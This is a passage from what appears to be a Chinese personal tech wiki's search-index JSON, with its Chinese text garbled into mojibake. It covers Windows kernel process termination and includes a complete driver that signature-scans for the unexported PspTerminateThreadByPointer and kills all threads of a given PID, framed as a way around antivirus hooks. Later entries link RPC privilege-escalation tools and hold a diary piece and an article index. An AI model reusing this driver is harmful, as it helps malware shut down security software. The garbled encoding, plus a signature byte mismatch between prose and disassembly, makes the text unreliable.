PsTerminateProcess æ€æ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œæƒ³ç”¨ PspTerminateProcess ä½ å°±å¾—å¤šè´¹ç‚¹æ—¶é—´æŠŠå®ƒçš„å‡½æ•°åœ°å€æ‰¾å‡ºæ¥ã€‚æ‰€ä»¥ä¸ºå®‰å…¨èµ·è§ï¼Œå¤§å¤šæ•°çš„æ€æ¯’è½¯ä»¶éƒ½æœ‰hookä½ PsTerminateProcessï¼Œ``PspTerminateProcess` å°±ä¸ä¸€å®šäº†ã€‚ å¦‚ä¸‹æ‰€ç¤ºä¸º PsTerminateProcess çš„åæ±‡ç¼–ä»£ç ï¼š 123456789101112131415kd&gt; u PsTerminateSystemThread L10nt!PsTerminateSystemThread:805d3594 8bff mov edi,edi805d3596 55 push ebp805d3597 8bec mov ebp,esp805d3599 64a124010000 mov eax,dword ptr fs:[00000124h]805d359f f6804802000010 test byte ptr [eax+248h],10h805d35a6 7507 jne nt!PsTerminateSystemThread+0x1b (805d35af)805d35a8 b80d0000c0 mov eax,0C000000Dh805d35ad eb09 jmp nt!PsTerminateSystemThread+0x24 (805d35b8)805d35af ff7508 push dword ptr [ebp+8]805d35b2 50 push eax805d35b3 e828fcffff call nt!PspTerminateThreadByPointer (805d31e0)805d35b8 5d pop ebp805d35b9 c20400 ret 4 è¿™é‡Œçš„ e82bfcffff å¯ä»¥ä½œä¸ºç‰¹å¾ç ã€‚ PspTerminateProcess å‡½æ•° å‡½æ•°å®šä¹‰ 1234NTSTATUS PspTerminateProcess( EPROCESS pEprocess, NTSTATUS ExitCode); å‚æ•° è¯´æ˜ pEprocess è¦å…³é—­çš„è¿›ç¨‹çš„EPROCESS ExitCode è¿›ç¨‹çš„é€€å‡ºç  ç”±äºè¿™ä¸ªå‡½æ•°æ˜¯æœªå¯¼å‡ºçš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œè¦å…ˆåœ¨å†…å­˜ä¸­æ‰¾åˆ°è¿™ä¸ªå‡½æ•°æ‰å¯ä»¥è°ƒç”¨ã€‚è¿™é‡Œé€‰æ‹©æ‰¾åˆ°è¿™ä¸ªå‡½æ•°çš„åŠæ³•æ˜¯é€šè¿‡å†…æ ¸æ¨¡å—éå†çš„åŠæ³•æ¥æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°ã€‚ å‡½æ•°å®ç° PspTerminateProcess å‡½æ•°å®ç°å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415PETHREAD Thread;NTSTATUS Status = STATUS_NOTHING_TO_TERMINATE;PAGED_CODE();PSTRACE(PS_KILL_DEBUG, &quot;Process: %p ExitStatus: %p\\n&quot;, Process, ExitStatus);PSREFTRACE(Process);/* Check if this is a Critical Process */if (Process-&gt;BreakOnTermination)&#123; /* Break to debugger */ PspCatchCriticalBreak(&quot;Terminating critical process 0x%p (%s)\\n&quot;, Process, Process-&gt;ImageFileName);&#125; å…ˆæ˜¯æ£€æŸ¥æ˜¯å¦æœ‰è°ƒè¯•å™¨æŒ‚åœ¨ä¸Šé¢å¹¶ä¸”è¦æ±‚é€€å‡ºè¿›ç¨‹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨ï¼Œå¦‚æœéœ€è¦åˆ™è°ƒç”¨ PspCatchCriticalBreak ä¸­æ–­è¿‡å»ã€‚PspCatchCriticalBreak çš„å®ç°æˆ‘æ€»è§‰å¾—åº”è¯¥æ˜¯ReactOS é‡Œè°ƒå†…æ ¸çš„ä¸´æ—¶åšæ³•ï¼ŒNTå†…æ ¸åº”è¯¥ä¸æ˜¯è¿™ä¹ˆå¹²çš„ï¼Œæ‰€ä»¥æš‚æ—¶ç•¥è¿‡ä¸çœ‹ã€‚ï¼ˆå…¶å®é€»è¾‘å¾ˆç®€å•ï¼Œä¸€çœ¼å°±èƒ½æ‰«æ˜ç™½ï¼‰ï¼Œæ¥ç€çœ‹ PspTerminateProcessï¼š 123456789101112131415/* Set the delete flag */InterlockedOr((PLONG)&amp;Process-&gt;Flags, PSF_PROCESS_DELETE_BIT);ç„¶åè°ƒç”¨å¦‚ä¸‹æ–¹æ³•åœ¨FlagsåŸŸé‡Œç½®ä½ï¼Œæ ‡æ˜è‡ªå·±å·²ç»ç»“æŸ/* Get the first thread */Thread = PsGetNextProcessThread(Process, NULL);while (Thread)&#123; /* Kill it */ PspTerminateThreadByPointer(Thread, ExitStatus, FALSE); Thread = PsGetNextProcessThread(Process, Thread); /* We had at least one thread, so termination is OK */ Status = STATUS_SUCCESS;&#125; æ¥ç€å°±æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼šå…ˆæ‰¾åˆ°è¿›ç¨‹ä¸‹çš„ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œç„¶åé¡ºç€çº¿ç¨‹åˆ—è¡¨è®¿é—®æ‰€æœ‰çš„çº¿ç¨‹ï¼Œè°ƒç”¨ PspTerminateThreadByPointer ç»“æŸå®ƒã€‚ç­‰æ‰€æœ‰çš„çº¿ç¨‹éƒ½é€€å‡ºçš„æ—¶å€™ï¼Œè¿›ç¨‹è‡ªç„¶ä¹Ÿå°±æ¶ˆäº¡äº†ï¼ˆæœ€åä¸€ä¸ªçº¿ç¨‹é€€å‡ºæ—¶è´Ÿè´£å¹²æ‰è¿›ç¨‹ï¼‰ã€‚ PsGetNextProcessThread æ˜¯åœ¨ EPROCESS ç»“æ„ ThreadListHead æŒ‡å‘çš„çº¿ç¨‹åˆ—è¡¨é‡Œéå†ï¼Œç¨‹åºå¾ˆç®€å•ã€‚æœ‰è¶£çš„æ˜¯ PspTerminateThreadByPointer å‡½æ•°ï¼Œè¿™æ˜¯ç»“æŸçº¿ç¨‹çš„æ ¸å¿ƒç¨‹åºã€‚ç¨‹åºä¸»ä½“åœ¨æˆ‘æ‰‹å¤´çš„ReactOSé‡Œæ²¡æœ‰ï¼Œæ³„éœ²çš„nt4ä»£ç çœ‹è¿‡ä½†åˆä¸ä¾¿è´´å‡ºï¼Œæ‰€ä»¥åªèƒ½ç•¥è¯´ï¼šå¤§è‡´çš„åšæ³•å°±æ˜¯ç”Ÿæˆä¸€ä¸ªAPCæ’å…¥åˆ°ç›®æ ‡çº¿ç¨‹é‡Œï¼Œè€Œè¯¥APCæ‰€ä½œçš„äº‹æƒ…å°±æ˜¯è°ƒç”¨ PspExitThread é€€å‡ºã€‚ å…³äºAPCçš„è¯¦ç»†å†…å®¹è¯·çœ‹è¿™é‡Œã€‚ç›¸ä¿¡æœ‰å¿ƒçš„ç­’å­å®Œå…¨æœ‰èƒ½åŠ›è‡ªå·±å±±å¯¨ä¸€ä¸ª PspTerminateThreadByPointer å‡ºæ¥ã€‚ PspTerminateProcessæ‰€ä½œçš„æœ€åä¸€ä»¶äº‹æƒ…å‘¢ï¼Œå°±æ˜¯æ£€æµ‹æ˜¯å¦çœŸæœ‰çº¿ç¨‹è¢«ç»“æŸï¼Œå¦‚æœæ ¹æœ¬å°±æ²¡æœ‰è¿™æ ·çš„çº¿ç¨‹ï¼Œé‚£è¿˜å¾—è‡ªå·±è´Ÿè´£æŠŠå¥æŸ„è¡¨é‡Œè¡¨ç¤ºè‡ªå·±çš„é‚£ä¸€é¡¹æ¸…æ‰ï¼š 123456/* Check if there was nothing to terminate or if we have a debug port */if ((Status == STATUS_NOTHING_TO_TERMINATE) || (Process-&gt;DebugPort))&#123; /* Clear the handle table anyway */ ObClearProcessHandleTable(Process);&#125; ä½†å‡¡æœ‰è¿½æ±‚ä¸€ç‚¹çš„æ€è½¯å‘¢ï¼Œè¿™é‡Œé¢çš„ç»å¤§å¤šæ•°å‡½æ•°æ¯”å¦‚ PsTerminateProcessï¼Œ``PspTerminateProcesså’ŒPspTerminateThreadByPointer` ç­‰éƒ½ä¼šæœ‰hookä½ï¼Œé˜²æ­¢æœ‰äººå¹²åäº‹ã€‚å¼ºåŠ¿ä¸€ç‚¹çš„è¿APCç›¸å…³çš„æ“ä½œä¹Ÿè¦hookä½ã€‚ å¦‚ä½•æŸ¥æ‰¾ PspTerminateProcess 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;ntifs.h&gt; typedef NTSTATUS(*pfnPspTerminateThreadByPointer)(PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate); VOID DriverUnload(IN PDRIVER_OBJECT driverObject);PVOID FindTargetFunc(); // å¯»æ‰¾å‡½æ•°åœ°å€PEPROCESS PsGetThreadProcess(PETHREAD pEThraed); // æ ¹æ®EPROCESSå¾—åˆ°EPROCESS ULONG g_uPID = 176; // è¦å…³é—­çš„è¿›ç¨‹PID NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)&#123; NTSTATUS status = STATUS_SUCCESS; PETHREAD pEThread = NULL; PEPROCESS pEProcess = NULL, pThreadProcess = NULL; ULONG uThreadId = 0; pfnPspTerminateThreadByPointer PspTerminateThreadByPointer = NULL; PspTerminateThreadByPointer = (pfnPspTerminateThreadByPointer)FindTargetFunc(); if (PspTerminateThreadByPointer == NULL) &#123; goto exit; &#125; //è·å–è¦å…³é—­çš„è¿›ç¨‹çš„EPROCESS status = PsLookupProcessByProcessId((HANDLE)g_uPID, &amp;pEProcess); if (!NT_SUCCESS(status)) &#123; DbgPrint(&quot;PsLookupProcessByProcessId Error 0x%X\\r\\n&quot;, status); goto exit; &#125; // éå†æ‰€æœ‰çº¿ç¨‹ for (uThreadId = 4; uThreadId &lt; 0x8000; uThreadId += 4) &#123; status = PsLookupThreadByThreadId((HANDLE)uThreadId, &amp;pEThread); if (NT_SUCCESS(status)) &#123; // è·å–çº¿ç¨‹å¯¹åº”çš„è¿›ç¨‹ç»“æ„å¯¹è±¡ pThreadProcess = PsGetThreadProcess(pEThread); if (pThreadProcess == pEProcess) &#123; PspTerminateThreadByPointer(pEThread, 0, 1); DbgPrint(&quot;æˆåŠŸå…³é—­çº¿ç¨‹\\r\\n&quot;); &#125; ObDereferenceObject(pEThread); &#125; &#125; ObDereferenceObject(pEProcess); driverObject-&gt;DriverUnload = DriverUnload;exit: return STATUS_SUCCESS;&#125; VOID DriverUnload(IN PDRIVER_OBJECT driverObject)&#123; DbgPrint(&quot;é©±åŠ¨å¸è½½å®Œæˆ\\r\\n&quot;);&#125; PVOID FindTargetFunc()&#123; PVOID pFunAddr = NULL; PUCHAR pPsTerminateSystemThreadAddr = NULL; UNICODE_STRING uStrFuncName = RTL_CONSTANT_STRING(L&quot;PsTerminateSystemThread&quot;); pPsTerminateSystemThreadAddr = (PUCHAR)MmGetSystemRoutineAddress(&amp;uStrFuncName); while (MmIsAddressValid(pPsTerminateSystemThreadAddr) &amp;&amp; *pPsTerminateSystemThreadAddr != 0xC2) &#123; if (*pPsTerminateSystemThreadAddr == 0xE8) &#123; pFunAddr = (PVOID)((ULONG)pPsTerminateSystemThreadAddr + 5 + *(PULONG)(pPsTerminateSystemThreadAddr + 1)); break; &#125; pPsTerminateSystemThreadAddr++; &#125; return pFunAddr;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Windows/API","slug":"Windows-API","permalink":"https://hodlyounger.github.io/tags/Windows-API/"},{"name":"process","slug":"process","permalink":"https://hodlyounger.github.io/tags/process/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€RPCã€‘æ¼æ´","date":"2023-10-08T06:01:23.607Z","path":"A_OS/Windows/RPC/ã€RPCã€‘æ¼æ´/","text":"0Day æ¼æ´æŒ‡è·¯ï¼š crisprss/PetitPotam: æ›¿ä»£PrintBugç”¨äºæœ¬åœ°ææƒçš„æ–°æ–¹å¼ï¼Œä¸»è¦åˆ©ç”¨MS-EFSRåè®®ä¸­çš„æ¥å£å‡½æ•° å€Ÿé‰´äº†Potitpotamä¸­å¯¹äºEFSRåè®®çš„åˆ©ç”¨,å®ç°äº†æœ¬åœ°ææƒçš„ä¸€ç³»åˆ—æ–¹å¼ Drawing on the use of the EFSR protocol in Potitpotam, a series of local rights escalation methods have been realized crisprss/magicAzureAttestService: é’ˆå¯¹äºAzureAttestServiceæœåŠ¡çš„æœ¬åœ°ææƒEopï¼Œå¾®è½¯è¡¨ç¤ºå·²ç»è¿›è¡Œä¿®å¤ ç›¸å…³åˆ†æï¼š postman rpcæœ¬åœ°è°ƒç”¨_å°è¯•è¿›è¡ŒRPCæ¼æ´æŒ–æ˜-CSDNåšå®¢ å¦‚ä½•æŒ–æ˜RPCæ¼æ´ï¼ˆPart 1ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° RPCè°ƒè¯•ï¼š Windbgç³»åˆ—-RPCè°ƒè¯• | Anhkggâ€™Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | å†…æ ¸ç ”ç©¶ | é€†å‘åˆ†æ | æ¼æ´åˆ†ææŒ–æ˜ æ‹“å±•é˜…è¯»ï¼š è®¿é—®ä»¤ç‰Œï¼šã€windows è®¿é—®æ§åˆ¶ã€‘ä¸€ã€è®¿é—®ä»¤ç‰Œ - å°æ—é‡å¤« - åšå®¢å›­ Windows Access Tokenææƒ - zpchcbd - åšå®¢å›­","tags":[{"name":"RPC","slug":"RPC","permalink":"https://hodlyounger.github.io/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"}]},{"title":"é‡Šæ€€","date":"2023-09-18T05:27:41.901Z","path":"diary/é‡Šæ€€/","text":"çœŸæ­£çš„æˆç†Ÿï¼Œå¤§æ¦‚å°±æ˜¯ï¼Œå–œæ¬¢çš„ä¸œè¥¿è¿˜æ˜¯å–œæ¬¢ï¼Œåªæ˜¯ä¸å†å¼ºæ±‚æ‹¥æœ‰äº†ï¼Œå®³æ€•çš„ä¸œè¥¿è¿˜æ˜¯å®³æ€•ï¼Œåªæ˜¯æ•¢äºé¢å¯¹äº†ã€‚ æˆé•¿çš„æ„ä¹‰å°±åœ¨äºï¼Œæ€»æœ‰ä¸€å¤©ï¼Œæˆ‘ä»¬è¦å­¦ä¼šå¦ç„¶é¢å¯¹ç”Ÿå‘½ä¸­æ‰€æœ‰çªå¦‚å…¶æ¥çš„å¢ƒé‡ã€‚ æœ‰çš„äººç¦»å¼€ï¼Œæœ‰çš„äººèµ°æ¥ï¼Œæœ‰çš„äººé‡é€¢ï¼Œæœ‰çš„äººå†ä¹Ÿä¸è§ã€‚ å¤ªé˜³ç…§å¸¸å‡èµ·ï¼Œè‰æœ¨å²å²æ¯è£ã€‚ æ‰€æœ‰çš„èˆä¸å¾—ï¼Œæ‰€æœ‰çš„æ— å¥ˆï¼Œéƒ½æœ‰é‡Šæ€€çš„ä¸€å¤©ã€‚ ä½ ä¸€ä¸ªäººï¼Œè¿‡å¾—å¥½å—ï¼ŸåŠªåŠ›ç”Ÿæ´»ï¼Œå°±æ˜¯ç­”æ¡ˆã€‚ äººè¿™ä¸€è¾ˆå­ï¼Œæœ‰äººç¾¡æ…•ä½ ï¼Œæœ‰äººçœ‹ä¸èµ·ä½ ï¼Œæœ‰äººè¯¯ä¼šä½ ï¼Œæœ‰äººè®¨åŒä½ ï¼Œä¹Ÿæœ‰äººå«‰å¦’ä½ ï¼Œä¸è¦åœ¨ä¹åˆ«äººæ€ä¹ˆçœ‹ä½ ã€‚ ä¸€å®šè¦å‘Šè¯‰è‡ªå·±ï¼Œèº«ä½“æ˜¯è‡ªå·±çš„ï¼Œä¸€å®šè¦çˆ±æƒœï¼Œå¿ƒæƒ…ä¹Ÿæ˜¯è‡ªå·±çš„ï¼Œä¸€å®šè¦é¡¾åŠï¼Œä¸è¦ä¸ºäº†é‚£äº›ä¸å€¼å¾—çš„äººå’Œäº‹ä¸ºéš¾è‡ªå·±ã€‚ æŠŠèº«ä½“å…»å¥½ï¼Œå«ä½“è´¨ï¼ŒæŠŠå¿ƒæƒ…è°ƒå¥½ï¼Œå«æ ¼å±€ï¼ŒæŠŠæ—¥å­è¿‡å¥½ï¼Œå«æœ¬äº‹ã€‚ ç°åœ¨è¿™ä¸ªç¤¾ä¼šï¼Œå½“é¢ä¸€å¥—èƒŒåä¸€å¥—ï¼Œå£æ˜¯å¿ƒéçš„äººå¤šäº†å»äº†ï¼Œæ‰€ä»¥åšå¥½è‡ªå·±å°±è¡Œï¼Œå‰©ä¸‹çš„äº¤ç»™è‰¯å¿ƒï¼ æœ‰äº›ä¸œè¥¿ï¼Œå¾—ä¹‹æˆ‘å¹¸ï¼Œå¤±ä¹‹æˆ‘å‘½ï¼Œé€‰æ‹©æ”¾ä¸‹ï¼Œä¸æ˜¯ä¸ºäº†åŸè°…åˆ«äººï¼Œåªæ˜¯ä¸ºäº†æ”¾è¿‡è‡ªå·±ã€‚ è®°å¾—æœ‰äººè¯´è¿‡ï¼Œä¸€ä¸ªäººé¦–å…ˆè¦çˆ±è‡ªå·±ï¼Œæ‰æœ‰èƒ½åŠ›çˆ±åˆ«äººã€‚","tags":[],"categories":[{"name":"diary","slug":"diary","permalink":"https://hodlyounger.github.io/categories/diary/"}]},{"title":"æ–‡ç« æ±‡æ€»","date":"2023-09-18T05:27:41.860Z","path":"ã€Wikiã€‘readme/","text":"ğŸ  è¿”å› Qt Qt é¼ æ ‡ hover æ“ä½œæ—¶å¼¹å‡ºæ–‡å­—æ°”æ³¡ Qt Http ä¸‹è½½ï¼ˆè½¬è½½ï¼‰ pngå’Œjpgæ ¼å¼çš„å›¾ç‰‡(äºŒ) Qt é‡å¯ Qt åœ†å½¢è¿›åº¦æ¡ QtåŠ¨ç”»ç±» Qtè·å–æ§ä»¶ä½ç½® Qt æˆªå›¾ Qtåœ¨Winç³»ç»Ÿä¸Šçš„æ¶ˆæ¯é€šçŸ¥ Qt è‡ªå®šä¹‰æ°”æ³¡ Qtæ’ä»¶â€”â€”ä½¿ç”¨ QtCipherSqlitePlugin å¯¹æ•°æ®åº“è¿›è¡ŒåŠ å¯† Qtå¸¸ç”¨åŸºç¡€ä»£ç æ±‡æ€» QListWidget ç”¨æ³•æ•´ç† ã€ä¸€æ–‡ææ‡‚ã€‘qss ä½¿ç”¨ QWebEngineView åŠ è½½ç½‘é¡µæ…¢çš„é—®é¢˜ çª—ä½“ä¸æ˜¾ç¤ºæˆ–åŠé€æ˜ QTableWidget éå† Qtçª—å£é€‚é…ç³»ç»Ÿç¼©æ”¾ QLineEdit ä¿®æ”¹éƒ¨åˆ†æ–‡æœ¬æ ·å¼ QStackWidgetåŠ¨ç”»2 Qt å› ä¸ºæ§½å‡½æ•°é—®é¢˜æˆ–è€…é€»è¾‘é—®é¢˜å¯¼è‡´é‡å¤newé—®é¢˜è§£å†³åŠæ³•åŠå»ºè®® Qtä»»åŠ¡æ æ˜¾ç¤ºè¿›åº¦æ¡ QStackWidgetåŠ¨ç”»ï¼ˆ1ï¼‰ Qt å¯åŠ¨åŠ¨ç”» Qt åŠ¨ç”»æ•ˆæœ ï¼ˆæŠ–åŠ¨ã€ä¸‹å ã€é€æ˜åº¦ï¼‰ Qtäº‹ä»¶è¿‡æ»¤å™¨ï¼ˆeventFilterï¼‰ Qtå›¾ç‰‡æ—‹è½¬ Qt çª—å£å±…ä¸­æ˜¾ç¤º Qtå®ç°çª—å£æ‹–æ‹½ Qt å›½é™…åŒ– Linux Linux RPC LinuxæŸ¥è¯¢æ˜¯å¦å®‰è£…äº†æŸä¸ªè½¯ä»¶ 5 ç¯å¢ƒå˜é‡ä¸æ–‡ä»¶æŸ¥æ‰¾ LinuxåŸºç¡€å…¥é—¨15 Linuxè¿›ç¨‹æ¦‚å¿µ Linuxå†…æ ¸2 è·Ÿè¸ªåˆ†æLinuxå†…æ ¸çš„å¯åŠ¨è¿‡ç¨‹ lså‘½ä»¤è¯¦è§£ Linux å†…æ ¸åˆ†æé…å¥—å®éªŒ linux å†…æ ¸1 å®Œæˆä¸€ä¸ªç®€å•çš„æ—¶é—´ç‰‡è½®è½¬èº²åˆ°ç¨‹åºå†…æ ¸ä»£ç  å·¥å…· Readme å·¥å…·ä½¿ç”¨æ‰‹å†Œ è‡ªåŠ¨ç”Ÿæˆ readme æ–‡æ¡£ Windows Procmon è¿‡æ»¤ç”¨æ³• Win7 ä½¿ç”¨æœªç­¾åé©±åŠ¨ç¨‹åº FormatMessageå‡½æ•°çš„ä½¿ç”¨ Windowsèšç„¦ä¸æ›´æ–° ç›‘æ§ç³»ç»Ÿäº‹ä»¶ï¼ˆç½‘å¡ï¼‰ winuserè¯´æ˜ cmdâ€”â€”route çƒ­è¡¥ä¸æ”¯æŒ ç½‘ç»œè¿æ¥äº‹ä»¶ ç›‘æ§è·¯ç”±äº‹ä»¶ ä¸€ä¸ªå®Œæ•´çš„wfpé©±åŠ¨ ææƒå·¥å…· psExec.exe æ‰¹å¤„ç†è·å–ipåˆ°å‰ªåˆ‡æ¿ æœåŠ¡ä¸­ä»¥ç®¡ç†å‘˜\\æ™®é€šæƒé™å¯åŠ¨è¿›ç¨‹ Windows é™æƒ ä½¿ç”¨ UMDH å®šä½ç”¨æˆ·æ¨¡å¼å†…å­˜æ³„æ¼ iphepler æ¥å£æ•´ç† ææƒ ç›‘æ§æŒ‡å®šç½‘å¡äº‹ä»¶ C++ é€šè¿‡ COM ç»„ä»¶ å¯ç”¨\\ç¦ç”¨\\æŸ¥çœ‹ ç½‘å¡çŠ¶æ€ æ“ä½œç½‘å¡ç±» ç›‘æ§ç½‘å¡äº‹ä»¶ ä½¿ç”¨ winsock2 ç›¸å…³å‡½æ•° åŠ è½½åŠ¨æ€åº“ (loadlibrary) windows æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨å‚æ•°å‘½ä»¤è¡Œ ã€ç®¡é“ã€‘ï¼ˆäºŒï¼‰ ç®¡é“é€šä¿¡ ã€ç®¡é“ã€‘ï¼ˆä¸€ï¼‰ åˆè¯†ç®¡é“ å…¶ä»– å­—ç¬¦ä¸²ç±»å‹è½¬æ¢æ•´ç†(charã€TCHARã€stringã€wstringã€CStringã€WCHAR) å¯†é’¥åˆ†é… ç¬¬7ç«  ç½‘ç»œå®‰å…¨ å¸¸ç”¨å†™æ³•æ•´ç† å†…å­˜æ³„æ¼åˆ†æå®æˆ˜ å‹å…ƒ UML ç‰‡æ®µè¯´æ˜ é…ç½®å¤šä¸ªè´¦å· 3-hexo ä¸»é¢˜å¿«æ·é”® å‡½æ•°å£°æ˜ &lt;2&gt; const å…³é”®å­— &lt;3&gt; ç¡®å®šå¯¹è±¡ä½¿ç”¨å‰åˆå§‹åŒ– è¿”å›å€¼ç±»å‹çš„è§„èŒƒ &lt;4&gt; äº†è§£C++é»˜è®¤åˆ›å»ºå¹¶è°ƒç”¨çš„å‡½æ•° OSIå‚è€ƒæ¨¡å‹ ä¸‰é»‘è±†æµ† C++ æšä¸¾ typora bluebook è‡ªå®šä¹‰ä¿®æ”¹ä¸»é¢˜ä»£ç  tcp.flags è¯´æ˜ Xcode ä¸‹è½½ä¸å®‰è£… UnSplash è·å–éšæœºå›¾ç‰‡çš„API ç³»ç»Ÿé” ç®¡é“demo libeventâ€”â€”evconnlistener_new_bind(1) ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹ä¸€ä¹¦é™„å½•ä¸­è‹±è¯­å•è¯æ•´ç† Curl è¯·æ±‚ Https æ­£åˆ™è¡¨è¾¾å¼åå‘å¼•ç”¨ åˆ‡æ¢shell IPv6 socket é•¿è¿æ¥ TCP/IPçš„å››å…ƒç»„ã€äº”å…ƒç»„ã€ä¸ƒå…ƒç»„ Curlä½¿ç”¨çš„ä¸€äº›demoï¼Œè®°å½• ä¸´æ—¶æ–‡ä»¶ pngå’Œjpgæ ¼å¼çš„å›¾ç‰‡(ä¸€) è‡ªç„¶è¾©è¯æ³• QAction Icon å¤§å°é—®é¢˜ æ–‡ä»¶å¤§å°æ¢ç®—æ–¹æ³• GO HACK PEæ–‡ä»¶åˆ†æ try-catchå— Lambdaè¡¨è¾¾å¼ using ç”¨æ³•æ•´ç† åŠ¨æ€å£°æ˜å­ç±» å„ç§å®å®šä¹‰ç”¨æ³•æ•´ç† æ–‡ä»¶åç¼€æ ¡éªŒ Json11 C++ ç”¨æ³•æ€»ç»“ â° æ—¶é—´å¤„ç† visual studio ç¼–è¯‘å‘Šè­¦å¸¸è§å¤„ç†æ‰‹æ®µ TypeScript ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ TODO using ç”¨æ³•æ•´ç† åŠ¨æ€å£°æ˜å­ç±» å„ç§å®å®šä¹‰ç”¨æ³•æ•´ç† æ–‡ä»¶åç¼€æ ¡éªŒ ã€ä¸æ•¢è¯´ä¸€æ–‡ææ‡‚ã€‘VLD å†…å­˜æ³„æ¼å®šä½ å…±äº«æ–‡ä»¶å¤¹ libevent http server OSIä¸ƒå±‚ç½‘ç»œåè®®æ¨¡å‹å„å±‚åè®® éŸ³é¢‘æˆ¿é—´åˆ›å»ºåŠè¿æ¥è¯´æ˜ å£°ç½‘å‚èµ›ç»å†è®°å½•â€”â€”ç™½æ¿æ’ä»¶å¼€å‘(å‰ç«¯) æ‰‹å†Œ ä»£ç è§„èŒƒ git emojiæ‰‹å†Œ Typora Emoji Visual Assist å¿«æ·é”®æ•´ç† å‰ç«¯æ ·å¼é…ç½® style å¸¸ç”¨å˜é‡åç¼©å†™ å†™ä½œåä½œæ‰‹å†Œ Git é€ŸæŸ¥æ‰‹å†Œ å¸¸è§ç¼–ç¨‹å‘½åç¼©å†™ ç¼–ç¨‹å¸¸ç”¨è‹±è¯­è¯æ±‡ winDbg è°ƒè¯•æ‰‹å†Œ è‹±é›„è”ç›Ÿè¯­å½• éšæœºå­—ç¬¦ä¸² SQLite3 æ•°æ®åº“åŠ å¯† è„šæœ¬ Wikiè‡ªåŠ¨æ›´æ–°è„šæœ¬ CPP C++ å¸¸è§é”™è¯¯â€”â€”æ— æ³•è§£æçš„å¤–éƒ¨ç¬¦å·","tags":[],"categories":[]},{"title":"","date":"2023-09-18T05:27:41.860Z","path":"index/","text":"å­¦ä¹ |è®°å½•|åˆ†äº« ğŸ¤—ğŸ™‚ğŸ¤©ğŸ¤”ğŸ¤¨ğŸ˜—ğŸ¥°ğŸ˜˜ğŸ˜€ğŸ˜ğŸ˜‚ğŸ¤£ğŸ˜ƒğŸ˜„ğŸ˜…ğŸ˜†ğŸ˜—ğŸ¥°ğŸ˜˜ğŸ˜ğŸ˜ğŸ˜‹ğŸ˜ŠğŸ˜‰ğŸ˜™ğŸ˜šğŸ˜ğŸ˜‘ğŸ˜¶ğŸ™„ğŸ™‚ğŸ¤—ğŸ˜ğŸ¤©ğŸ˜£ğŸ¤”ğŸ˜¥ğŸ¤¨ğŸ˜®ğŸ˜›ğŸ˜ŒğŸ˜´ğŸ˜«ğŸ¥±ğŸ˜ªğŸ˜¯ğŸ¤ğŸ˜œğŸ˜ğŸ¤¤ğŸ˜’ğŸ˜“ğŸ˜”ğŸ˜•ğŸ™ƒğŸ¤‘ğŸ˜²â˜¹ğŸ™ğŸ˜ğŸ˜–ğŸ˜ŸğŸ˜¤ğŸ˜¬ğŸ¤¯ğŸ˜©ğŸ˜¨ğŸ˜§ğŸ˜¦ğŸ˜­ğŸ˜¢ğŸ˜°ğŸ˜±ğŸ¥µğŸ¥¶ğŸ˜³ğŸ¤ªğŸ˜µğŸ¥´ğŸ¤®ğŸ¤¢ğŸ¤•ğŸ¤’ğŸ˜·ğŸ¤¬ğŸ˜¡ğŸ˜ ğŸ¤§ğŸ˜‡ğŸ¥³ğŸ¥ºğŸ¤ ğŸ¤¡ğŸ¤¥ğŸ¤«ğŸ’€ğŸ‘ºğŸ‘¹ğŸ‘¿ğŸ˜ˆğŸ¤“ğŸ§ğŸ¤­â˜ ğŸ‘»ğŸ‘½ğŸ‘¾ğŸ¤–ğŸ’©ğŸ˜ºğŸ˜¸ğŸ±â€ğŸ‘¤ğŸ˜¾ğŸ˜¿ğŸ™€ğŸ˜½ğŸ˜¼ğŸ˜»ğŸ˜¹ ä¸ªäººç»´æŠ¤çš„wikiï¼Œæ¶‰åŠå·¥ä½œã€å­¦ä¹ ä¸­ç”¨åˆ°çš„æŠ€æœ¯å’Œæ–¹æ¡ˆä»¥åŠå·¥å…· æˆ‘çš„ç®€å† ğŸ“š æ–‡ç« åˆ—è¡¨ ğŸ‘‰ Xmindæ–‡ä»¶ ğŸµ éŸ³ä¹ ğŸ¨ å°é¢ ğŸ” èµ„æº ğŸ¨ UML ğŸ“º Code","tags":[],"categories":[]}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç 